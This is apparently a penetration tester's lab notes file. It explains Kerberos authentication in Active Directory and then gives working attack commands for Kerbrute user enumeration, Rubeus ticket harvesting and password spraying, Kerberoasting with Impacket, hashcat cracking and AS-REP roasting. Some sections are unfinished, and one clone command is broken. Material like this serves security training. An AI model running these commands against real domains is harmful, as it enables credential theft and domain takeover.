# Kerberos

Default authentication service for Microsoft Windows domains. Intended to be more "secure" than NTLM by using third party ticket authorization and stronger encryption.

## Summary

Details the general concepts of Kerberos and exploitation basics.

* [Common Terminology](#common-terminology)
	* [AS-REQ w/ Pre-Authentication](#as-req-w/-pre-authentication)
	* [Ticket Granting Ticket Contents](#ticket-granting-ticket-contents)
	* [Service Ticket Contents](#service-ticket-contents)
	* [Kerberos Authentication Overview](#kerberos-authentication-overview)
	* [Kerberos Tickets Overview](#kerberos-tickets-overview)
* 

### Common Terminology:

| Term | Description |
| --- | --- |
| Ticket Granting Ticket (TGT) | A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain |
| Key Distribution Center (KDC) | The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service. | 
| Authentication Service (AS) | Issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets |
| Ticket Granting Service (TGS) | Takes the TGT and returns a ticket to a machine on the domain |
| Service Principal Name (SPN) | An identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set |
| KDC Long Term Secret Key (KDC LT Key) | Based on the KRBTGT service account. Used to encrypt the TGT and sign the PAC |
| Client Long Term Secret Key (Client LT Key) | Based on the computer or service account. It is used to chelc the encrypted timestamp and excrypt the session key |
| Service Long Term Secret Key (Service LT Key) | Based on the service account. Used to encrypt the service portion of the service ticket and sign the PAC |
| Session Key | Issued by the KDC when a TGT is issued. User will provide the session key to the KDC along with the TGT when requesting a service ticket |
| Privilege Attribute Certificate (PAC) | Holds all the user's relevant information, sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user |

### AS-REQ w/ Pre-Authentication

Starts when a user requests a TGT from the KDC. In order to validate user, KDC must follow exact steps. First step: user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user. If successful, the KDC will issue a TGT as well as a session key for the user.

#### Ticket Granting Ticket Contents

The TGT is provided by the user to the KDC: the KDC validates the TGT and returns a service ticket:

<INSERT PICTURE HERE>

#### Service Ticket Contents

Contains twp portions:
- Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash
- User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key

<INSERT PICTURE>

#### Kerberos Authentication Overview

<INSERT PICTURE>

AS-REQ - 1. The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

AS-REP - 2. The Key Distribution Center verifies the client and sends back an encrypted TGT.

TGS-REQ - 3. The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

TGS-REP - 4. The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

AP-REQ - 5. The client requests the service and sends the valid session key to prove the user has access.

AP-REP - 6. The service grants access

#### Kerberos Tickets Overview

### Attack Privilege Requirements

* Kerbrute Enumeration - No domain access required
* __Pass the Ticket__ - Access as a user to the domain required
* __Kerberoasting__ - Access as any user required
* __AS-REP Roasting__ - Access as any user required
* __Golden Ticket__ - Full domain compromise (domain admin) required
* __Silver Ticket__ - Service hash required
* __Skeleton Key__ - Full domain compromise (domain admin) required

### Kerbrute Enumeration

Enumeration tool used to brute-force and enumerate valid active-directory users by abusing Kerberos pre-authentication.

NEED to add DNS domain name along with machine IP to `/etc/hosts` on attack machine

```bash
[IP] domain.local
```

By abusing pre-authentication, you do not trigger the account failed to log on event. Can brute force only by sending a single UDP frame to the KDC

#### Installation

1. [Precompiled binary](https://github.com/ropnop/kerbrute/releases)

2. Rename kerbrute_linux_amd64 to kerbrute

3. `chmod +x kerbrute` - make kerbrute executable

#### Enumerating Users

1. cd to directory w/ Kerbrute

2. Download worldist to enumerate [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt)

3. `./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt` this will brute force user accounts forma domain controller using a supplied wordlist

### Rubeus

[Rubeus](https://github.com/GhostPack/Rubeus)

Rubeus is an adaptation of the kekeo tool. Many tools included: overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

#### Harvesting Tickets w/ Rubeus

```powershell
#Tells Rubeus to harvest for TGTs every 30 seconds
Rubeus.exe harvest /interval:30
```

#### Brute Forcing - Password Spraying w/ Rubeus

```powershell
# Add the IP and domain name to the host file
echo 10.10.183.153 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```

```powershell
# will take a given password and "spray" against all found users then giev the .kirbi TGT for said user
Rubeus.exe brute /password:Password1 /noticket
```

### Kerberoasting

Allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. Success of the attack depends on how strong the password is and if it is trackeable as well as the privileges of the cracked service account. 

Can enumerate Kerberoastable accounts with BloodHound. Will allow you to see what kind of accounts you can kerberoast if they are domain admins, and connections to the rest of the domain.

#### Kerberoasting w/ Rubeus

```powershell
# Will dump the Kerberos hash of any Kerberoastable users
Rubeus.exe kerberoast
```

#### Kerberoasting w/ Impacket

##### Installation

Impacket installs haven't been stable since 0.9.20. Install < 0.9.20

```bash
# navigate to preferred directory to save tools
cd /opt

# Download precompiled package
git clone https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19

# Navigate to directory
cd Impacket-0.9.impacket_0_9_19

# Install all dependancies
pip install .
```

##### Use

```bash
# Navigate to where GetUserSPNs.py is located
cd /usr/share/doc/python3-impacket/examples/

# will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.183.153 -request

#crack hash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

Can now dump NTDS.dit if domain admin service account.

### AS-REP Roasting w/ Rubeus

Similar to Kerberoasting: dumps the krbasrep5 hashes of accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting, these users do not have to be service accounts. the user must have pre-authentication disabled.

```powershell
# will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes
# Execute on target
Rubeus.exe asreproast
```


